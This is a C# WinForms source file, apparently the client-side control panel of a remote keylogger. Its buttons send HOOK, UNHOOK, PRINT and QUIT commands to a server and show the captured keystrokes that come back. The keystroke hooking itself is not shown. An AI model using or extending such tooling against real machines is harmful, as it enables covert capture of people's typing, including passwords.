using System;
using System.Windows.Forms;

namespace client
{
    public partial class keylog : Form
    {
        private bool isHooked = false;  // Biến trạng thái

        public keylog()
        {
            InitializeComponent();
            // Khởi tạo form với chế độ Hook
            SetupInitialState();
        }
        private void SetupInitialState()
        {
            // Thiết lập trạng thái ban đầu cho các nút
            isHooked = true; // Chế độ mặc định là Hook
            button1.Enabled = false; // Vô hiệu hóa nút "Hook"
            button2.Enabled = true;  // Kích hoạt nút "Unhook"

            // Gửi lệnh HOOK mặc định khi form được tạo
            String s = "HOOK";
            Program.nw.WriteLine(s);
            Program.nw.Flush();

            MessageBox.Show("Chế độ Hook đã được kích hoạt.");
        }

        // Gửi lệnh HOOK
        private void button1_Click(object sender, EventArgs e)
        {
            if (isHooked)
            {
                MessageBox.Show("Bạn đã ở chế độ Hook rồi.");
                return;
            }

            // Gửi lệnh HOOK
            String s = "HOOK";
            Program.nw.WriteLine(s);
            Program.nw.Flush();

            // Cập nhật trạng thái
            isHooked = true;

            // Cập nhật giao diện
            button1.Enabled = false;  // Vô hiệu hóa nút "Hook"
            button2.Enabled = true;   // Kích hoạt nút "Unhook"
            MessageBox.Show("Chế độ Hook đã được kích hoạt.");
        }


        // Gửi lệnh UNHOOK
        private void button2_Click(object sender, EventArgs e)
        {
            if (!isHooked)
            {
                MessageBox.Show("Bạn đã ở chế độ Unhook rồi.");
                return;
            }

            // Gửi lệnh UNHOOK
            String s = "UNHOOK";
            Program.nw.WriteLine(s);
            Program.nw.Flush();

            // Cập nhật trạng thái
            isHooked = false;

            // Cập nhật giao diện
            button1.Enabled = true;   // Kích hoạt nút "Hook"
            button2.Enabled = false;  // Vô hiệu hóa nút "Unhook"
            MessageBox.Show("Chế độ Unhook đã được kích hoạt.");
        }

        // Gửi lệnh PRINT và hiển thị kết quả
        private void button3_Click(object sender, EventArgs e)
        {
            SendCommand("PRINT");

            var data = new char[5000];
            int rec = Program.nr.Read(data, 0, 5000);

            txtKQ.Text += (rec == 0) ? "" : new string(data);
        }

        // Xóa nội dung trong RichTextBox
        private void butXoa_Click(object sender, EventArgs e) => txtKQ.Clear();

        // Đóng form và gửi lệnh QUIT
        private void keylog_closing(object sender, FormClosingEventArgs e) => SendCommand("QUIT");

        // Hàm gửi lệnh đến server
        private void SendCommand(string command)
        {
            Program.nw.WriteLine(command);
            Program.nw.Flush();
        }
        private void txtKQ_TextChanged(object sender, EventArgs e)
        {
            // Thực hiện các hành động khi văn bản trong txtKQ thay đổi
            // Ví dụ: tự động cập nhật một số thông tin, làm mới giao diện...
        }

        private void keylog_Load(object sender, EventArgs e)
        {

        }
    }
}
